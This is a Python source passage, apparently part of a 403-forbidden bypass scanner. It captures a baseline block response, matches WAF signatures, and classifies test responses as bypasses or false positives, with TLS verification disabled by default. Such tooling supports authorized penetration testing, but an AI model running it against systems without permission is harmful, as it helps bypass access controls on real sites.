# Response analysis helpers
# ──────────────────────────────────────────────────────────────────────────
def extract_title(html_text: str) -> str:
    """Extract <title> using BeautifulSoup. Returns '' if not found."""
    try:
        soup = BeautifulSoup(html_text, "html.parser")
        if soup.title and soup.title.string:
            return soup.title.string.strip()
    except Exception:
        pass
    return ""


def hash_body(body_bytes: bytes) -> str:
    return hashlib.sha256(body_bytes).hexdigest()


def detect_waf(body_text: str, headers: dict) -> str:
    """
    Detect known WAF / block-page fingerprints in response body or headers.
    Returns the vendor name if matched, else ''.
    """
    lowered_body = (body_text or "").lower()
    lowered_headers = " ".join(f"{k}:{v}" for k, v in headers.items()).lower()
    haystack = lowered_body + " " + lowered_headers

    for vendor, indicators in WAF_SIGNATURES.items():
        for indicator in indicators:
            if indicator in haystack:
                return vendor
    return ""


def compare_response(baseline: Baseline, candidate_text: str, candidate_len: int,
                      candidate_title: str, candidate_hash: str) -> float:
    """
    Compare candidate response to the baseline 403 response using
    difflib.SequenceMatcher. Returns a similarity ratio (0.0 - 1.0).
    A ratio close to 1.0 means the response is essentially identical
    to the original 403 page (likely false positive / custom error page
    served with a different status, or a soft-403).
    """
    if candidate_hash == baseline.body_hash:
        return 1.0
    matcher = difflib.SequenceMatcher(None, baseline.body_text, candidate_text)
    return matcher.ratio()


# ──────────────────────────────────────────────────────────────────────────
# Core request wrapper
# ──────────────────────────────────────────────────────────────────────────
def safe_request(session: requests.Session, url: str, headers: dict = None,
                  timeout: float = DEFAULT_TIMEOUT, verify: bool = False,
                  delay: float = DEFAULT_DELAY):
    """
    Perform a GET request safely. Never raises — returns a tuple:
        (status_code:int|None, body_text:str, content_length:int, resp_headers:dict, error:str|None)
    """
    try:
        if delay > 0:
            time.sleep(delay)
        resp = session.get(url, headers=headers or {}, timeout=timeout,
                            verify=verify, allow_redirects=True)
        body_text = resp.text
        # build redirect chain
        redirect_chain = [h.headers.get('Location') or getattr(h, 'url', '') for h in resp.history]
        return resp.status_code, body_text, len(resp.content), dict(resp.headers), redirect_chain, None
    except requests.exceptions.Timeout:
        return None, "", 0, {}, [], "TIMEOUT"
    except requests.exceptions.ConnectionError as e:
        return None, "", 0, {}, [], "CONNECTION_ERROR"
    except requests.exceptions.RequestException as e:
        return None, "", 0, {}, [], f"REQUEST_ERROR: {e}"
    except Exception as e:
        return None, "", 0, {}, [], f"UNKNOWN_ERROR: {e}"


# ──────────────────────────────────────────────────────────────────────────
# Baseline request
# ──────────────────────────────────────────────────────────────────────────
def baseline_request(session: requests.Session, url: str, timeout: float,
                      verify: bool, delay: float) -> Optional[Baseline]:
    """
    Send an unmodified request to the target to capture the original
    403 response fingerprint: status, length, title, and SHA256 hash.
    This baseline is later used to detect false positives (e.g. a WAF
    page returned with a 200 status that is functionally identical to
    the original 403 block page).
    """
    status, body_text, length, headers, redirect_chain, error = safe_request(
        session, url, timeout=timeout, verify=verify, delay=delay
    )
    if error or status is None:
        log(f"[red][-] Baseline request failed for {url}: {error}[/red]")
        return None

    title = extract_title(body_text)
    body_hash = hash_body(body_text.encode("utf-8", errors="ignore"))

    log(
        f"[cyan][i] Baseline → {url}  status={status}  len={length}  "
        f"title='{title[:40]}'  sha256={body_hash[:12]}...[/cyan]"
    )
    return Baseline(status_code=status, content_length=length, title=title,
                     body_hash=body_hash, body_text=body_text)


# ──────────────────────────────────────────────────────────────────────────
# Classification logic
# ──────────────────────────────────────────────────────────────────────────
def classify_response(baseline: Baseline, status: int, body_text: str,
                       length: int, title: str, headers: dict) -> tuple:
    """
    Classify a test response relative to the baseline.
    Returns (classification:str, waf_vendor:str, similarity:float)

    Classification logic:
      1. If status code is still 403 (or unchanged from baseline) -> ORIGINAL
      2. If status is in BYPASS_STATUS_CODES:
           a. Check for WAF block-page fingerprints -> WAF_BLOCK if matched
              even though status looks successful.
           b. Compute SHA256 + similarity ratio vs baseline.
              - If hash matches baseline OR similarity >= threshold AND
                content length/title are essentially unchanged -> FALSE_POSITIVE
              - Else -> BYPASS (real difference detected)
      3. Anything else (4xx/5xx other than 403) -> treated as ORIGINAL-class
         (not a bypass, not worth reporting as WAF block).
    """
    body_hash = hash_body(body_text.encode("utf-8", errors="ignore"))
    similarity = compare_response(baseline, body_text, length, title, body_hash)

    # Case 1: status unchanged from baseline / still blocked
    if status == baseline.status_code:
        return "ORIGINAL", "", similarity

    # Case 2: status looks like a potential bypass
    if status in BYPASS_STATUS_CODES:
        waf_vendor = detect_waf(body_text, headers)
        if waf_vendor:
            return "WAF_BLOCK", waf_vendor, similarity

        content_len_diff = abs(length - baseline.content_length)
        title_diff = (title.strip() != baseline.title.strip())
        length_diff_significant = (
            baseline.content_length == 0 or
            content_len_diff / max(baseline.content_length, 1) > 0.05
        )

        # If everything is nearly identical to baseline -> false positive
        if (similarity >= SIMILARITY_THRESHOLD
                and not length_diff_significant
                and not title_diff):
            return "FALSE_POSITIVE", "", similarity

        # Genuine difference detected -> real bypass
        return "BYPASS", "", similarity

    # Anything else (other 4xx/5xx) — not a bypass, not the original 403
    return "ORIGINAL", "", similarity


